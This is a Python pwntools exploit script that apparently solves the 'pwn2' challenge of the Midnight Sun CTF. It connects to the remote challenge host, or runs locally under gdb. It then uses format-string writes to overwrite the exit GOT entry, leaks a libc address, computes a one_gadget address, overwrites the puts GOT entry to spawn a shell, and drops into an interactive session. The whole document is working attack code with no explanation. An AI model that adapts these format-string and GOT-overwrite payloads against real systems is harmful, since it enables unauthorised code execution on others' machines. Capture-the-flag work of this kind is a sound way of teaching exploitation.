from pwn import *
import sys

if sys.argv[1]=='local':
    io = process('./pwn2',env={'LD_PRELOAD':'./libc.so.6'})
    gdb.attach(io,'b*0x8048688')
else:
    io = remote('pwn2-01.play.midnightsunctf.se' ,'10002')

main = 0x08048655
exit = 0x0804b020
puts = 0x0804b01c

def pad(s):
        return s+"X"*(64-len(s))

payload = ''
payload += p32(exit)
payload += "%{}d".format(0x8655-0x4)
payload += "%7$hn"
payload = pad(payload)
io.sendlineafter(': ',payload)
payload = "%37$p"
io.sendline(payload)

io.recvuntil(': ')
io.recvline()
io.recvuntil(': ')
leak = io.recvline()
sys = hex(int(leak,16)+0x23e8f)
base= hex(int(sys,16)-0x3cd10)
one_gadget = hex(int(base,16)+0x6729f)

log.info("system : {}".format(sys))
log.info("gadget : {}".format(one_gadget))

payload = ''
payload += p32(puts)
payload += p32(puts+1)
payload += "%{}d".format(int(one_gadget[-2::],16)-0x8)
payload += "%22$hhn"
payload += "%{}d".format(int(one_gadget[-4:-2],16)+0x61)
payload += "%23$hhn"
payload = pad(payload)

io.sendlineafter(': ',payload)



io.interactive()
